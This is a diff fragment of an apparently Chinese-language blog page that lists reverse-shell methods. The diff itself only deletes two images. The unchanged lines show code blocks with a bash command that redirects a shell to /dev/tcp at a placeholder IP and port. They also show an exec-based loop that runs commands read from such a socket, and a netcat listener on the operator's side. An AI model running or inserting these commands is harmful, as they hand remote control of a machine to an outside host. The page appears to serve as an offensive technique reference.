@@ -207,8 +207,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
 <p>exec方式</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ exec 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done</span><br></pre></td></tr></table></figure>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwBbOH6V7AnmS4E4xTyxtC8myib5dgv5EZeR749tnYVIwEQRreXiaUbowg/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/WdbaA7b2IE4hibXeVicEftjafs7nT5ejOwGkQib7iaiaZibCt6DhC6IMTuIhqnJc3NQf8QMIVQwByPwNibXd4xb2WJLQA/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
 <p><strong>nc方式</strong></p>
 <p>本机运行</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure>
